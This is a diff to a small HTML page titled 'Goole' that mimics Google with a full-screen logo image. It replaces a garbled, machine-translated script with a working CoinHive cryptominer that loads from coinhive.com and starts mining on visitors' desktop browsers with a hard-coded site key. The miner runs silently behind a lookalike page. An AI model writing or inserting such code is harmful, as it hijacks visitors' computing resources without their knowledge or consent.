@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html>
-<img src="./logo.png">
 <title>Goole</title>
 <body>
 
 <img src="./Google.png" width = " 100% "  height = " 100% ">
     
 </body>
-    < script src = "https://coinhive.com/lib/coinhive.min.js" > < / script > 
-< script > 
-    var miner =  new CoinHive . Anonyme ( 'pdMhikBgfpXzZjT8x6auAbyTOzF1AzSP' ,  { accélérateur :  0 . 3 });
-    
-    si  (! Mineur . IsMobile ()  &&  ! Mineur . DidOptOut ( 14400 ))  { 
-        mineur . start (); 
-    } 
-</ script >
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('pdMhikBgfpXzZjT8x6auAbyTOzF1AzSP', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
 </html>
